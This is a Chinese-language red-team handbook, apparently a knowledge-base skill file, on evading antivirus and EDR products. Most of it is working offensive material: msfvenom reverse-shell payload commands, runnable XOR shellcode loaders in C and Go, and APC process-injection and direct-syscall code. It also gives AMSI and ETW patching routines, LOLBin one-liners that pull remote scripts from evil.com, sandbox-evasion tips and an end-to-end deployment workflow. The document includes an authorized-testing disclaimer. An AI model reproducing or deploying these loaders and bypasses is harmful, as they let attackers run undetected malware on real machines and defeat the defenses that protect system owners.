---
name: kb-av-edr-bypass
description: AV/EDR 免杀与对抗实战手册——shellcode 生成、加载器编写、AMSI/ETW 绕过、Syscall 直调、LOLBin、免杀工作流
tags: [免杀, EDR绕过, shellcode, AMSI, 红队]
date: 2026-08-14
---

# AV/EDR 免杀对抗手册（2026）

> 读者画像：Web 渗透熟练、有 GSL5 WebShell 管理经验、能拿主机权限，但做不出过杀软的 shellcode 加载器。
> 本手册目标：让你看懂检测原理，能自己写/拼装免杀载荷。
> **合规红线：仅用于授权渗透测试、SRC、攻防演练。禁止用于未授权环境。详见 §9。**

---

## 0. 结论先行：免杀的本质

免杀 = 让载荷在「文件层面」不匹配特征 + 在「内存/行为层面」不被 EDR 逻辑命中。
核心公式：**免杀率 ≈ 静态混淆（躲签名）× 执行方式（躲 hook/行为）× 环境感知（躲沙箱）**。
你已有 GSL5 说明能拿主机，缺的就是把 C2 会话 payload 变成「查不到、盯不上、测不出」的形态。
先看敌人在哪，再选打法。

## 1. 检测原理（先懂敌人）

### 1.1 AV 三层检测（传统杀软）

| 层 | 检测方式 | 绕过思路 |
|---|---|---|
| 静态 | 文件哈希/特征码/YARA 规则匹配 | 改字节、加密、重新编译、加壳 |
| 启发式 | 静态看代码结构、API 调用序列、熵值 | 拆分功能、正常 API 混入、低熵 |
| 动态 | 沙箱/虚拟执行观察行为 | 沙箱探测、延迟执行、检测到环境就装乖 |

### 1.2 AV vs EDR

- **AV**：主要看文件本体（静态+轻量沙箱），攻击点在「编译产物」。
- **EDR**：主要看进程运行时行为——谁调用了哪些 API、内存里有没有可执行可疑代码、线程栈是否正常、父子进程关系。攻击点在「运行时」。所以只做静态混淆能过 AV，但一跑就被 EDR 抓。

### 1.3 EDR 三大数据源（必须理解）

1. **用户态 hook（inline hook）**：EDR 在 `ntdll.dll`（和部分 kernel32 导出函数）开头写入 `jmp` 跳板，先于你的代码执行检测逻辑。你调 `NtAllocateVirtualMemory`，先过 EDR 的检查。**→ 绕过：Syscall 直调、unhook、动态 API 解析。**
2. **ETW（Event Tracing for Windows）**：Windows 自带遥测总线，进程写日志事件，EDR 订阅读取。.NET/CLR、PowerShell、进程创建、模块加载都通过 ETW 上报。**→ 绕过：patch `EtwEventWrite`（见 §5）。**
3. **内核回调**：EDR 驱动在 Ring0 注册回调（进程创建 PsSetCreateProcessNotifyRoutine、线程、映像加载、注册表等），Ring0 视角用户态 patch 挡不住。**→ 无法从用户态绕过，只能靠行为隐蔽（不做可疑动作）。**

### 1.4 AMSI 检测原理

AMSI（Antimalware Scan Interface）是 PowerShell/VBScript/.NET 等脚本宿主在**执行前**把脚本内容交给杀软扫描的接口。关键点：脚本在内存里以明文存在，`amsi.dll!AmsiScanBuffer` 被调用即把缓冲区内容送检。所以：
- 字符串层面不能有已知恶意 payload 明文 → 需要运行时解密；
- 最直接绕过 = 让 `AmsiScanBuffer` 失效（返回 CLEAN 或直接 ret，见 §4）。

## 2. Shellcode 基础

### 2.1 msfvenom 多格式生成

```bash
# 原始字节（最常用，交给自写加载器）
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f raw -o shell.bin
# C 数组（直接嵌进 C 加载器）
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f c -o shell.c
# C# byte[]（嵌进 .NET 加载器）
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f csharp -o shell.cs
# 十六进制 / base64 / PowerShell 一行
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f hex -o shell.hex
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f psh-cmd -o shell.ps1
# 不再用 -e shikata_ga_nai 硬编码（新杀软能解，编码应自写，见 §3.1）
```

注意：`-p windows/x64/...`（64 位）对应 64 位加载器；`windows/...`（32 位）对应 32 位。**位数错配 = 直接崩**。还有 `-a x64 --platform windows` 显式指定。

### 2.2 PE 头速览（懂这些够用）

```
DOS头(MZ) → PE头(PE\0\0) → 可选头(ImageBase, EntryPoint, SectionAlignment)
 → 节表(.text可执行代码 / .data全局数据 / .rdata只读 / .rsrc资源)
```
- **特征码匹配目标**：PE 头 + 节区内容。改一个字节哈希就变，但启发式会看结构。
- 加载器要点：shellcode 是**位置无关代码（PIC）**，不依赖加载地址，直接拷到内存即可执行。
- 恶意文件常见标志：`VirtualAlloc` + `PAGE_EXECUTE_READWRITE` + 回调执行 → EDR 静态启发式的核心嫌疑组合。

### 2.3 加载器最小模型（所有加载器的骨架）

```
解密(内存中还原shellcode) → 申请可执行内存(VirtualAlloc) → 拷贝(WriteProcessMemory/memcpy)
 → 改保护为RX(VirtualProtect) → 创建/回调执行(CreateThread/回调/APC)
```

## 3. 免杀手法分层（从入门到进阶）

### 3.1 L1 编码混淆：XOR / AES（必会）

自写编码器（不用 msfvenom 的公开 encoder），关键在**密钥与算法自己掌控**：

```python
# tools: encrypt.py —— 生成加密的 shellcode（build 阶段用）
import sys
KEY = b"V1per!@#2026"          # 自定义密钥，别用公开示例
data = open("shell.bin","rb").read()
enc = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])   # XOR
open("shell_xor.bin","wb").write(enc)
print(enc.hex())               # 粘贴进加载器
```

```c
// loader.c —— 最小 XOR 解密加载器（编译：x86_64-w64-mingw32-gcc -o ld.exe loader.c -mwindows）
#include <windows.h>
unsigned char buf[] = { 0xfc,0x48,... };        // 上面 python 输出的十六进制
unsigned char key[] = "V1per!@#2026";
void main() {
    for (int i = 0; i < sizeof(buf); i++)       // 运行时解密（内存中才有明文）
        buf[i] ^= key[i % (sizeof(key)-1)];
    void *mem = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    memcpy(mem, buf, sizeof(buf));              // 拷入可执行内存
    ((void(*)())mem)();                          // 回调方式执行
}
```

升级点：XOR 换成 **AES-CBC**（`pycryptodome` 加密，C 里用 `BCryptDecrypt` 或纯 C 实现解密），密钥再 XOR 一层藏进代码常量。低熵 + 无公开签名 = 静态基本不报。

### 3.2 L2 分离加载（把特征拆开）

特征码集中在 shellcode 本体，所以**别把明文 shellcode 写进文件**：
- **远程加载**：shellcode 加密后放 C2/VPS（`https://x/payload.bin`），加载器运行时下载+解密+执行 → 磁盘文件里没有恶意字节。
- **文件分离**：shellcode 藏进图片（追加到 jpg 尾部）/ 资源段 / 注册表 / 其他正常文件，加载器去取。
- 关键点：远程加载器本身的网络行为要像正常软件（HTTPS、自定义 UA、别用 `http://ip/payload.bin` 这种明显 IOC）。

### 3.3 L3 白名单 LOLBin（免落地/免特征）

微软签名的合法程序帮我们干活，AV 默认信任：

```bash
# mshta：跑 HTA/JS/VBS（经典外链执行）
mshta.exe javascript:a=GetObject("script:https://evil.com/payload.sct").Exec();close();
# regsvr32：Squiblydoo，远程 SCT 脚本对象（免落地）
regsvr32.exe /s /n /u /i:https://evil.com/payload.sct scrobj.dll
# rundll32：执行 DLL 导出函数 / 借合法 DLL 跑 SCT
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval(..."shellcode"...)  # 老手法，已高检出
rundll32.exe advpack.dll,LaunchINFSection evil.inf,,1
# msbuild：编译执行 XML 里的内联 C#（无 EXE 落盘，绕过 AppLocker 默认规则）
msbuild.exe payload.xml
# msiexec / wmic：跑 MSI / XSL（wmic 新版被默认禁，优先前几个）
```
注意：**LOLBin 执行方式本身已是 EDR 高可疑信号**（正常没人用 mshta 跑远端脚本）。它们的作用是「免落地 + 初始执行」，配合进程注入做纵深，别裸用。

### 3.4 L4 进程注入（进合法进程躲行为检测）

核心思路：恶意代码在合法进程（svchost/explorer/OneDrive）里跑，EDR 看到的是"合法进程在做可疑事"，比"自写 exe 在做可疑事"好骗。

**经典但高危（已被 EDR 精确标注）**：
```
CreateRemoteThread 注入 = OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
→ EDR 对这条序列有几十条规则，2024 年后基本必死。
```

**进阶变体（更 OPSEC）**：
- **Early Bird APC 注入**：以挂起方式创建合法进程（`CREATE_SUSPENDED`）→ `NtAllocateVirtualMemory` 写 shellcode → `NtQueueApcThread` 排队 APC → `NtResumeThread` 在进程初始化早期执行（EDR 常还没完成对该进程的 hook）。主线程还没跑，APC 先跑。
- **Process Hollowing 改良**：经典版 `NtUnmapViewOfSection` 换镜像会被查"无映射源的可执行内存"；改良版（half-way hollowing）**覆盖挂起进程自己的 .text 节**，内存仍被磁盘合法文件支撑，不触发"unbacked RWX"启发式。
- **Thread Hijacking**：`NtGetContextThread` + `NtSetContextThread` 劫持现有线程执行，不创建新线程（创建线程是重点监控项）。

```c
// Early Bird APC 关键序列（概念演示，Syscall 版本见 §3.5）
CreateProcessA("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
NtAllocateVirtualMemory(hProc, &addr, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
NtWriteVirtualMemory(hProc, addr, shellcode, len, &n);   // 写 shellcode
NtProtectVirtualMemory(hProc, &addr, &sz, PAGE_EXECUTE_READ, &old);  // 改 RX，别留 RWX
NtQueueApcThread(hThread, addr, 0, 0, 0);                 // 排队 APC
NtResumeThread(hThread, NULL);                            // 恢复线程即执行
```

### 3.5 L5 Syscall 直调（2024-2026 EDR 对抗主流）

EDR 的 inline hook 挂在 `ntdll.dll` 用户态函数开头（一个 `jmp EDR` 跳板）。**直接调用 `syscall` 指令绕过整个 ntdll stub**，hook 完全失效。

**Hell's Gate（动态取 SSN）核心逻辑**：遍历 ntdll 导出表，对 `NtXxx` 函数读首字节——`0xB8`（mov eax, SSN）就是干净的；开头是 `0xE9`（jmp，被 hook）则 Halo's Gate 向相邻函数偏移找没被 hook 的。

```c
// 直接 syscall x64 模板（SSN 随系统版本变化，必须运行时获取，此值仅演示）
__asm__(
    ".global NtAllocateVirtualMemory\n"
    "NtAllocateVirtualMemory:\n"
    "  mov r10, rcx\n"        // syscall 调用约定要求 r10 保存首参
    "  mov eax, 0x18\n"       // SSN: NtAllocateVirtualMemory (Win10 21H2 演示值)
    "  syscall\n"
    "  ret\n");
```
- **Direct syscall**：自己的代码里 `syscall`。缺点：返回地址指向我们自己模块 → EDR 查栈能发现。
- **Indirect syscall**：`jmp` 到 ntdll 里的 `syscall; ret` 小片段执行 → 返回地址看起来来自 ntdll，栈检测失效。代表实现：Hell's Gate / Halo's Gate / TartarusGate / FreshyCalls / SysWhispers2 / DInvoke。
- **堆栈欺骗（call stack spoofing）**：把调用栈伪装成合法链（如被注入进程的正常调用链），Moonwalk++ 这类 2025 工具已能用 ROP 链藏栈，反制 Hunt-Sleeping-Beacons 这类栈检查。
- **unhook**：从磁盘/`\KnownDlls\ntdll.dll` 重新读取干净的 ntdll 副本，覆盖回内存里被 hook 的区域；Perun's Fart 变体"JIT 解hook-执行-再hook"应对周期性扫描。

### 3.6 L6 无文件攻击

全程不落盘：`regsvr32/mshta/msbuild` 或 PowerShell 从远程拉取加密数据 → 内存解密 → 反射执行。配合 §4/§5 的 AMSI/ETW 绕过，磁盘上只有"无害的启动命令"。局限：重启即失，需要持久化（注册表/计划任务/WMI 订阅）才稳。

## 4. AMSI 绕过

PowerShell/.NET 执行前必经 AMSI 扫描，绕过分三代：

```powershell
# ① 经典反射改字段（Matt Graeber，2024 后该字符串已被特征标，需拆词混淆）
$r=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils')
$r.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ② 内存 patch AmsiScanBuffer（主流，需 C# Add-Type 编译后调用）
#    原理：把 AmsiScanBuffer 开头改为 mov eax,0x80070057; ret → 扫描返回"参数错误"，
#    杀软拿不到内容。2025 年后 Add-Type 与硬编码"AmsiScanBuffer"字符串成为检测点，
#    用反射获取地址代替硬编码字符串。
```

**绕过手段演进（2025-2026）**：
- **Patch `AmsiScanBuffer` 返回 CLEAN/错误码**：C/C++ 里 `VirtualProtect` + 覆盖函数头（经典但已被 EDR 盯上，检测"patch 痕迹"）。
- **无 patch 反射替换（TrollAMSI）**：不碰 amsi.dll 字节，用 .NET 反射把内部 `ScanContent` 方法替换成返回 1 的自定义方法——无 P/Invoke、无 VirtualProtect、JIT/IL 层操作，更难被监控。
- **Page Guard 异常（patchless）**：给 `AmsiScanBuffer` 所在页设 `PAGE_GUARD`，任何调用触发 `STATUS_GUARD_PAGE_VIOLATION`，由自定义 VEH 处理器把栈上结果参数改成 `AMSI_RESULT_CLEAN` 并跳过函数体——函数字节完全没动。
- **dotnet 侧**：`amsiInitFailed` 反射、`AmsiUtils` 相关 + 禁用 ScriptBlockLogging（`System.Management.Automation` 设置项）。

**注意**：AMSI bypass 与载荷执行是两个被分开检测的阶段——绕过动作本身要混淆，绕过后的执行代码也要加密，两段都干净才稳。

## 5. ETW patch 与 EDR 对抗

EDR 靠 ETW 收集 .NET/进程/模块遥测，且 CLR 事件全走 `ntdll!EtwEventWrite` 一个出口——**patch 它就能掐掉一大片遥测源**：

```c
// 把 EtwEventWrite 开头改成 ret，让所有 ETW 写入直接返回（C 内嵌）
void PatchEtw() {
    BYTE *p = (BYTE*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    DWORD old;
    VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old);
    p[0] = 0xC3;                          // ret：调用者以为写入成功，实际啥也没记
    VirtualProtect(p, 1, old, &old);
}
```
- 变体：patch `NtTraceEvent` syscall stub（同样 `ret`）；或 inline hook `EtwEventWrite` 选择性丢弃/篡改事件（TamperETW，做精细绕过）。
- **代价**：EtwEventWrite 被 patch 后返回"成功"但无日志，EDR 一旦做"跨源交叉验证"（ETW 静默但进程明明在干活）就会起疑。所以 ETW patch 只对纯 .NET/PS 载荷价值最大。
- **动态 API 解析（通用对抗）**：不直接调 `GetProcAddress`（会被 EDR 记行为），而是手动遍历 PEB → ntdll → 导出表，用哈希匹配函数名（API hashing）取地址，运行时再解。
- **断链/隐藏**：`NtSetInformationProcess` 设 BreakOnTermination、清 PEB 调试标志、抹掉内存中的 shellcode 明文（执行后立刻改回不可读页），对付内存扫描。

## 6. 工具与框架（思路参考，别全盘照搬）

- **Viper / Cobalt Strike / Sliver / SILENTTRINITY**：C2 框架，自带 payload 生成、反射加载、Bypass UDRL（User-Defined Reflective Loader，自定义反射加载器，过内存扫描关键）。你有 ChanaAgent C2/GSL5，本质同类——**学习它们的加载器思路**（分阶段 stager、内存加密、sleep mask），不必换框架。
- **Donut**：把 .NET 程序集 / EXE / DLL / VBS 转成 PIC shellcode（`donut.exe -i evil.exe -a 2 -f 1 -b 3 -o out.bin`），自带 AMSI/WLDP/ETW bypass 选项、熵控制、PE 头清零。**把 C2 载荷再包一层 shellcode 的常用道具。**
- **sRDI（Shellcode Reflective DLL Injection）**：把任意 DLL 转成自加载 shellcode，反射加载进内存，不落盘。Sliver/Inceptor 都集成了它。
- **ScareCrow**：载荷框架，专门把 payload 包装成合法签名软件的格式（如 ISO/LNK/HTA/InstallUtil），主打"看起来像正常分发物"。老项目但思路仍然有效。
- **开源 loader 学习名单（读代码学思路，别原样抄，抄了必被标）**：AsmLdr（栈欺骗+间接 syscall+模块踩踏）、NullGate（间接 syscall 库）、hellbird（Early Bird+Hell's Gate）、PhantomX（Go 全功能免杀框架）、Hooka（Go loader 生成器，AES/AMSI/ETW/unhook 全集成）、Stealth-Shellcode-Runner（AES+间接 syscall+hollowing）、GlobalAMSIBypass / TrollAMSI（AMSI 思路）。
- **本地验证 EDR 行为**：CrimsonEDR（模拟 EDR 检测 hook/AMSI/ETW patch/ntdll 是否被改）——开发期自测用，能帮你确认 patch 是否真的生效。

## 7. 免杀完整工作流

```
① msfvenom 生成 raw shellcode（x64，HTTPS stage）
② 自写脚本加密（AES/XOR，密钥随机化，别用公开 key）
③ 选执行链（按目标环境排序）：
   静态过不了 → 编码混淆 + 分离加载
   EDR 重 → Syscall 加载器 + Early Bird APC 注入合法进程 + 栈欺骗
   PowerShell 受限 → C/C++/Go 编译加载器 + LOLBin 启动
④ 编译加载器（跨平台编译：mingw 编 C / dotnet build 编 C# / go build 编 Go）
⑤ 测试（分层）：
   静态：本地杀软右键扫描 + 提交 VT（注意 §8 风险）
   动态：本地装了同款 EDR/杀软的机器实跑（挂起进程观察是否被杀）
   VT 沙箱：观察行为是否被报（多个引擎同时报 = 行为特征明显）
⑥ 迭代：报哪个引擎/报哪个行为 → 针对调（换编码/换注入法/加沙箱检测/加延时）
⑦ 上线：GSL5/你现有 C2 接管，跑任务，结束后清痕迹
```

**Go 加载器示例**（编译简单、免 GCC 依赖、交叉编译方便）：

```go
package main

import (
    "syscall"
    "unsafe"
)

var buf = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0} // msfvenom -f csharp 转成 Go 切片（截断示例）

func main() {
    key := []byte("V1per!@#2026")               // 与 python 加密端一致
    for i := range buf {
        buf[i] ^= key[i%len(key)]               // 运行时 XOR 解密
    }
    k32 := syscall.NewLazyDLL("kernel32.dll")
    va := k32.NewProc("VirtualAlloc")
    addr, _, _ := va.Call(0, uintptr(len(buf)), 0x3000, 0x40) // RWX
    for i, b := range buf {                     // 逐字节拷入内存
        *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
    }
    syscall.Syscall(addr, 0, 0, 0, 0)           // 执行
}
// 编译：GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o ld.exe loader.go
```

**C# 加载器**：`VirtualAlloc` + `Marshal.Copy` + `VirtualProtect(改RX)` + `Marshal.GetDelegateForFunctionPointer<Action>(p)()`。优点：配 PowerShell/msbuild/InstallUtil 可免落地；缺点：.NET 进程的 CLR 活动是 ETW 重点，必须配 ETW patch。

## 8. 常见坑与绕过（实战踩过的）

- **VT 指纹提示（重要）**：`*.exe` 上传 VirusTotal，样本会进各大厂商库并被标记，你的 loader 从此"一次曝光，终身被查"。**规范做法**：VT 只传与目标不同 key/不同混淆的变体；重负载文件在隔离 VM 里用本地杀软测；别把目标环境同款样本直接甩 VT。
- **沙箱检测**：VT/分析沙箱特征——进程列表（VBoxService/vmtoolsd/procmon）、显卡型号（Microsoft Basic Display Adapter = 虚拟显卡）、无前台窗口（`GetForegroundWindow()==NULL`）、`C:\analysis` 路径、`virustotal` 字样路径。检测到就 `Sleep(大)` 或退出执行假逻辑。注意：**沙箱探测本身是 EDR 行为信号**，做轻量、别一堆探测 API。
- **多引擎差异化**：卡巴/ESET 偏特征码 + 虚拟机；微软 Defender 偏 AMSI + 内存；360/火绒偏云查杀 + 行为。报哪个调哪个——报行为就换注入/加延时，报特征就换加密/重编译。
- **免杀时效性**：公开 POC / GitHub 项目被抄=几天内被标记。**自写优于抄开源**；跑一次大版本更新（换 key、换结构、换语言）比"微调混淆"有效得多。
- **位数/架构错配**：32/64 位 shellcode 与加载器不一致 → 秒崩。别忘 `VirtualProtect` 改 RX（留 RWX 是 EDR 最爱抓的点）。
- **别裸奔的细节**：硬编码 IP/域名特征（去 C2 指纹）、loader 不要有完整恶意 API 序列在导入表（用动态解析）、字符串全部加密、编译加 `-s -w`（Go）或 strip（C）减小分析面。
- **行为隐蔽 > 静态清零**：现代 EDR 能抓"看起来正常的进程做不正常的事"。隐藏进合法进程、不频繁创建线程、执行后抹内存，比单纯压 VT 检出更持久。

## 9. 合规提醒

- 本手册所有技术**仅限授权范围**：企业 SRC / EDU SRC / 公司授权渗透 / 攻防演练靶标。
- 未授权使用免杀载荷获取系统权限可能触犯《刑法》285 条（非法获取计算机信息系统数据/非法控制计算机信息系统罪）。切勿用于真实系统越权操作、批量横向、数据破坏。
- 测试环境建议使用隔离 VM + 快照；对真实目标严格执行授权书界定的范围与时间窗。

## Sources（2024-2026 查证）

- [RedOps: Indirect Syscalls & Dynamic SSN Retrieval via PEB/EAT](https://redops.at/en/blog/indirect-syscalls-and-dynamic-ssn-retrieval-via-peb-eat)
- [RedOps: Indirect Syscalls and Hooked SSNs](https://redops.at/en/blog/indirect-syscalls-and-hooked-ssns)
- [AsmLdr — 动态 shellcode 加载器（栈欺骗/间接 syscall/模块踩踏）](https://github.com/0xNinjaCyclone/AsmLdr)
- [NullGate — 间接 syscall 库](https://github.com/0xsch1zo/NullGate)
- [Moonwalk++ — Windows 调用栈欺骗对抗 EDR](https://www.esecurityplanet.com/threats/moonwalk-bypasses-edr-by-spoofing-windows-call-stacks/)
- [awesome-edr-evasion 资源清单](https://github.com/ruleaker/awesome-edr-evasion)
- [GlobalAMSIBypass — AMSI 内存 patch](https://github.com/chainski/GlobalAMSIBypass)
- [Patchless AMSI Bypass via Page Guard Exceptions](https://core-jmp.org/2026/05/patchless-amsi-bypass-via-page-guard-exceptions-2/)
- [TrollAMSI — 无 patch 反射替换 AMSI](https://github.com/cybersectroll/TrollAMSI)
- [Unicorn — TrustedSec AMSI bypass 技术](https://deepwiki.com/trustedsec/unicorn/2.2-amsi-bypass-techniques)
- [ETW-Bypass-Rust — patch NtTraceEvent/EtwEventWrite](https://github.com/0xflux/ETW-Bypass-Rust)
- [EDR Bypass Roadmap（API 颠覆演进）](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/)
- [winlow: EDR/AV evasion 章](https://github.com/adanto/winlow/blob/main/part5/03-edr-av-evasion.md)
- [CrimsonEDR — 模拟 EDR 行为自测](https://www.redpacketsecurity.com/crimsonedr-simulate-the-behavior-of-av-edr-for-malware-development-training/)
- [hellbird — Early Bird APC + Hell's Gate](https://github.com/grisuno/hellbird)
- [Stealth-Shellcode-Runner — AES+间接 syscall+hollowing](https://github.com/fmelipin/Stealth-Shellcode-Runner)
- [half-way-process-hollowing — OPSEC 版 hollowing](https://github.com/asvased/half-way-process-hollowing)
- [Ntdll-Apc-Injection-Trojans — NTAPI 层 APC 注入](https://github.com/Hue-Jhan/Ntdll-Apc-Injection-Trojans)
- [CrowdStrike: 8 大 LOLBin](https://www.crowdstrike.com/en-us/blog/8-lolbins-every-threat-hunter-should-know/)
- [VirusTotal 一行代码绕过（沙箱路径检测）](https://undercodetesting.com/bypassing-virustotal-with-one-line-of-code-a-new-malware-evasion-technique/)
- [Sandbox bypass（检测 VT/卡巴沙箱）](https://hackmag.com/security/sandbox-bypass)
- [OSEAF — 对抗性免杀研究（45+ 引擎逃逸）](https://www.sciencedirect.com/science/article/abs/pii/S1568494626006344)
- [Donut — PE/.NET 转 shellcode](https://github.com/TheWover/donut)
- [sRDI — 反射 DLL 注入 shellcode](https://github.com/monoxgas/sRDI)
- [Inceptor — 免杀框架（Donut/sRDI/编码链）](https://deepwiki.com/klezVirus/inceptor/4-key-components)
- [ScareCrow — 载荷伪装框架](https://github.com/optiv/ScareCrow)
- [Cobalt Strike 资源集（NtMapViewOfSection 注入/BOF）](https://github.com/CBstrike/Cobalt-Strike_)
